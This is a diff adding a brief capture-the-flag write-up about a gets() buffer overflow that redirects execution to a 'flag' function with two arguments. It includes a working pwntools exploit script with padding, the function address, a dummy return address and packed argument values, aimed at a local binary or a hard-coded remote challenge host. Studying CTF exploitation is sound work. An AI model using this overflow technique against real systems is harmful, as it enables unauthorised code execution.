@@ -1,0 +1,24 @@
+This challenge was a bufferoverflow from gets to function redirection 
+this challenge called a function with arguments 
+
+how you make a function call with arguments is
+
+payload = padding + func_addr + "RRRR" + p32/64(value of arg_1) + p32/64(value of arg_2)
+
+"RRRR" is the return address of the funciton with address func_addr ............. you could use the actual function return address as it all gets logged
+
+one more aspect is that argument has to be negative 
+p32/64 of negative wont give you anything so you have to provide a large number .... instead of trying several numbers
+
+print in a c program %u for a signed int it will give you the oveerloaded value for you to put into p32/64 which will not cause any error
+
+from pwn import *
+
+binary=context.binary=ELF("./vuln")
+n=int(input())
+p=remote("206.189.113.236",32084) if(n==1) else process(binary.path)
+p.recv()
+#3735928559 3235827725
+p.sendline(b"a"*188 + p32(binary.sym.flag)+b"CCCC"+p32(3735928559)+p32(3235827725))
+print(p.recv())
+p.interactive()
